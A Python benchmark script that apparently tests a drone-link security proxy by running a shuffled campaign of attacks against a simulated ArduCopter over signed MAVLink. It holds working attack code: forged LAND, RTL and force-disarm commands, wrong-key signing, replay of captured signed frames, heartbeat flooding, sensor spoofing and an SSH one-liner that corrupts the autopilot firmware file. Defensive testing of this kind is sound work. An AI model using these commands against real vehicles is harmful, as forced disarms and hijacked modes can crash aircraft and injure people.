# ruff: noqa  (bench script: quick one-off driver, not library code)
"""Randomised, overlapping attack campaign over the real radio, SIGNED link, against ArduCopter SITL.

usage: campaign.py <label> <posture> <seed>      (env: PI_KEY, REPO; optional PI_SSH)
Events (all 11, shuffled by the seed; three adjacent pairs overlap): forged_land, forged_force_disarm, forged_rtl_spoof255,
wrong_key_land, replay_loiter, flood, gps_glitch, alt_bias, batt_jump, freeze, fw_tamper.
Writes campaign_<label>.json (per-event outcome + bridge counters before/after, recoveries, 1 Hz timeline).
"""

import json
import os
import random
import socket
import subprocess
import sys
import time
import urllib.request

os.environ["MAVLINK20"] = "1"
from pymavlink import mavutil  # noqa: E402

label, posture, seed = sys.argv[1], sys.argv[2], int(sys.argv[3])
KEY = open("C:/afsitl/sign.key", "rb").read()
WRONG = open("C:/afsitl/wrong.key", "rb").read()
PI_KEY = os.environ["PI_KEY"]
PI = os.environ.get("PI_SSH", "ardra@169.254.225.172")
rng = random.Random(seed)
HUB = "tcp:127.0.0.1:5801"


def conn(sysid, key=None):
    c = mavutil.mavlink_connection(HUB, source_system=sysid, source_component=190)
    if key is not None:
        c.setup_signing(key, sign_outgoing=True, allow_unsigned_callback=lambda *a: True, link_id=1)
    return c


m = conn(255, KEY)  # the legitimate, signed pilot
a66 = conn(66)
a255 = conn(255)
wrong = conn(255, WRONG)  # attackers: unsigned x2, wrong-key signed
m.wait_heartbeat(timeout=90)
ts, tc = m.target_system, m.target_component
print("heartbeat over the radio", flush=True)
for sid, hz in (
    (mavutil.mavlink.MAV_DATA_STREAM_RAW_SENSORS, 0),
    (mavutil.mavlink.MAV_DATA_STREAM_RC_CHANNELS, 0),
    (mavutil.mavlink.MAV_DATA_STREAM_RAW_CONTROLLER, 0),
    (mavutil.mavlink.MAV_DATA_STREAM_EXTENDED_STATUS, 1),
    (mavutil.mavlink.MAV_DATA_STREAM_POSITION, 2),
    (mavutil.mavlink.MAV_DATA_STREAM_EXTRA1, 2),
    (mavutil.mavlink.MAV_DATA_STREAM_EXTRA2, 1),
    (mavutil.mavlink.MAV_DATA_STREAM_EXTRA3, 1),
):
    m.mav.request_data_stream_send(ts, tc, sid, hz, 1 if hz else 0)
    time.sleep(0.4)
m.param_set_send("ARMING_CHECK", 0)

st = {"mode": None, "armed": False, "alt": 0.0}
timeline = []
probes = {"sent": 0, "acked": 0}
hb_t = []
t0 = time.time()
next_tl = [t0]
last_hb = [0.0]


def pump(sec):
    end = time.time() + sec
    while time.time() < end:
        for c in (a66, a255, wrong):
            while c.recv_match(blocking=False) is not None:
                pass
        if time.time() - last_hb[0] >= 1.0:
            m.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0
            )
            last_hb[0] = time.time()
        x = m.recv_match(blocking=True, timeout=0.2)
        if x is not None:
            t = x.get_type()
            if t == "HEARTBEAT" and x.get_srcSystem() == 1 and x.get_srcComponent() == 1:
                hb_t.append(time.time())
                st["armed"] = bool(x.base_mode & 0x80)
                st["mode"] = x.custom_mode
            elif t == "GLOBAL_POSITION_INT":
                st["alt"] = x.relative_alt / 1000.0
            elif t == "COMMAND_ACK" and x.command == 176 and x.result == 0:
                probes["acked"] += 1
        if time.time() >= next_tl[0]:
            next_tl[0] += 1.0
            timeline.append(
                (round(time.time() - t0, 1), st["mode"], st["armed"], round(st["alt"], 1))
            )


def status():
    try:
        return json.load(urllib.request.urlopen("http://127.0.0.1:8090/status", timeout=4))
    except Exception as e:  # noqa: BLE001
        return {"error": str(e)}


def snap():
    s = status()
    if "error" in s:
        return s
    p = s.get("policy", {})
    f = s.get("frames", {})
    an = s.get("analyser", {})
    return {
        "t": round(time.time() - t0, 1),
        "alerts": an.get("alerts"),
        "counter_frames": an.get("counter_frames_sent"),
        "dropped_up": f.get("dropped_up"),
        "dropped_down": f.get("dropped_down"),
        "forwarded_down": f.get("forwarded_down"),
        "rewritten": p.get("rewritten"),
        "mode": s.get("mode"),
        "drops": {k: v for k, v in p.items() if k.startswith("dropped") and isinstance(v, int)},
        "mgmt_sent": (s.get("mgmt") or {}).get("sent"),
    }


def ctl_proxy(cmd):
    try:
        c = socket.create_connection(("127.0.0.1", 5807), timeout=3)
        c.sendall(cmd.encode())
        c.recv(10)
        c.close()
    except Exception as e:  # noqa: BLE001
        print("proxy ctl failed", e, flush=True)


def flag(name):
    open(f"C:/afsitl/{name}_{label}.flag", "w").write("1")


def ssh(cmd):
    subprocess.run(
        ["ssh", "-i", PI_KEY, "-o", "BatchMode=yes", PI, cmd],
        check=False,
        timeout=40,
        capture_output=True,
    )


def set_mode(c, mode):
    c.mav.set_mode_send(ts, mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mode)


def do_set_mode(c, mode):
    c.mav.command_long_send(ts, tc, 176, 0, 1, mode, 0, 0, 0, 0, 0)


captured = []


def grab_replay():
    sys.path.insert(0, os.environ["REPO"] + "/scripts/radio_test")
    from pymavlink.dialects.v20 import common as mav2
    from radio_hub import read_capture

    from aegisflight.proxy.transport import split_frames

    dec = mav2.MAVLink(None)
    dec.robust_parsing = True
    data = b"".join(d for _t, d in read_capture(f"C:/afsitl/hubcap_{label}/uplink.cap"))
    for fr in split_frames(data, 1 << 20)[0]:
        if fr.signed and fr.msgid == 76 and fr.sysid == 255:
            try:
                msg = dec.decode(bytearray(fr.raw))
                if msg.command == 176 and int(msg.param2) == 5:
                    captured.append(fr.raw)
            except Exception:  # noqa: BLE001
                pass


pump(50)


def takeoff():
    set_mode(m, 4)
    pump(3)
    m.mav.command_long_send(ts, tc, 400, 0, 1, 0, 0, 0, 0, 0, 0)
    pump(5)
    m.mav.command_long_send(ts, tc, 22, 0, 0, 0, 0, 0, 0, 0, 30)
    pump(28)


takeoff()
print("airborne", st, flush=True)
do_set_mode(m, 5)
pump(4)  # one signed LOITER, captured for the replay attack, then back to GUIDED
do_set_mode(m, 4)
pump(4)
grab_replay()
print("captured signed LOITER frames:", len(captured), flush=True)

EV = [
    "forged_land",
    "forged_force_disarm",
    "forged_rtl_spoof255",
    "wrong_key_land",
    "replay_loiter",
    "flood",
    "gps_glitch",
    "alt_bias",
    "batt_jump",
    "freeze",
    "fw_tamper",
]
rng.shuffle(EV)
gaps = [rng.uniform(40, 60) for _ in EV]
for i in rng.sample(range(1, len(EV)), 3):
    gaps[i] = rng.uniform(3, 8)  # three overlapping pairs
sched = []
at = 20.0
for ev, g in zip(EV, gaps, strict=True):
    at += g
    sched.append((round(at, 1), ev))
DUR = {"flood": 8, "gps_glitch": 25, "alt_bias": 15, "batt_jump": 15, "freeze": 15, "fw_tamper": 20}
print("schedule", sched, flush=True)


def start_event(ev):
    if ev == "forged_land":
        set_mode(a66, 9)
        do_set_mode(a66, 9)
        do_set_mode(a66, 9)
    elif ev == "forged_force_disarm":
        for _ in range(3):
            a66.mav.command_long_send(ts, tc, 400, 0, 0, 21196, 0, 0, 0, 0, 0)
    elif ev == "forged_rtl_spoof255":
        set_mode(a255, 6)
        do_set_mode(a255, 6)
        do_set_mode(a255, 6)
    elif ev == "wrong_key_land":
        set_mode(wrong, 9)
        do_set_mode(wrong, 9)
        do_set_mode(wrong, 9)
    elif ev == "replay_loiter":
        for raw in captured[:3]:
            a66.write(raw)
    elif ev == "flood":
        n = 0
        tt = time.time()
        while time.time() - tt < DUR["flood"]:
            a66.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0
            )
            n += 1
            pump(max(0.0, tt + n / 30.0 - time.time()))
    elif ev == "gps_glitch":
        flag("gps_fault")
    elif ev == "alt_bias":
        ctl_proxy("alt_bias 40")
    elif ev == "batt_jump":
        ctl_proxy("batt_jump 3")
    elif ev == "freeze":
        ctl_proxy("freeze")
    elif ev == "fw_tamper":
        ssh(
            "python3 -c \"p='/home/ardra/aegis_fw/autopilot.bin';b=bytearray(open(p,'rb').read());b[5000]^=0xFF;open(p,'wb').write(bytes(b))\""
        )


def stop_event(ev):
    if ev in ("alt_bias", "batt_jump", "freeze"):
        ctl_proxy("off")
    elif ev == "gps_glitch":
        flag("gps_clear")
    elif ev == "fw_tamper":
        ssh("cp /home/ardra/aegis_fw_orig/autopilot.bin /home/ardra/aegis_fw/autopilot.bin")


recoveries = []


def flying():
    return st["armed"] and st["mode"] == 4 and st["alt"] > 20


def ensure_flying():
    r = {"t": round(time.time() - t0, 1), "from": dict(st)}
    flag("gps_clear")
    for _ in range(4):
        pump(8)
        set_mode(m, 4)
        pump(3)
        m.mav.command_long_send(ts, tc, 400, 0, 1, 0, 0, 0, 0, 0, 0)
        pump(5)
        m.mav.command_long_send(ts, tc, 22, 0, 0, 0, 0, 0, 0, 0, 30)
        pump(30)
        if st["alt"] > 20:
            break
    r["ok"] = st["alt"] > 20
    r["took_s"] = round(time.time() - t0 - r["t"], 1)
    recoveries.append(r)


results = []
active = []
tstart = time.time()
i = 0
last_probe = time.time()
end_all = sched[-1][0] + 45
while time.time() - tstart < end_all:
    now = time.time() - tstart
    if i < len(sched) and now >= sched[i][0]:
        ev = sched[i][1]
        i += 1
        rec = {
            "event": ev,
            "t_start": round(time.time() - t0, 1),
            "before": snap(),
            "mode_before": st["mode"],
            "alt_before": st["alt"],
        }
        start_event(ev)
        rec["after_trigger"] = snap()
        active.append((time.time() + DUR.get(ev, 0), ev, rec))
        results.append(rec)
    for item in list(active):
        if time.time() >= item[0] and not item[2].get("stopped"):
            stop_event(item[1])
            item[2]["stopped"] = round(time.time() - t0, 1)
        if time.time() >= item[0] + 14 and "final" not in item[2]:
            item[2]["final"] = snap()
            item[2]["mode_after"] = st["mode"]
            item[2]["alt_after"] = st["alt"]
            item[2]["armed_after"] = st["armed"]
            active.remove(item)
    if time.time() - last_probe >= 20:
        do_set_mode(m, 4)
        probes["sent"] += 1
        last_probe = time.time()
    if not active and not flying():
        ensure_flying()
    pump(0.5)
gaps_hb = [
    (round(x - hb_t[0], 1), round(y - x, 1))
    for x, y in zip(hb_t, hb_t[1:], strict=False)
    if y - x > 3.0
]
out = {
    "label": label,
    "posture": posture,
    "seed": seed,
    "schedule": sched,
    "events": results,
    "recoveries": recoveries,
    "probes": probes,
    "heartbeat_gaps_over_3s": gaps_hb,
    "final_snap": snap(),
    "final_state": st,
    "timeline_1hz": timeline[::2],
    "t0": t0,
}
json.dump(out, open(f"C:/afsitl/campaign_{label}.json", "w"), default=str)
print("campaign done", flush=True)
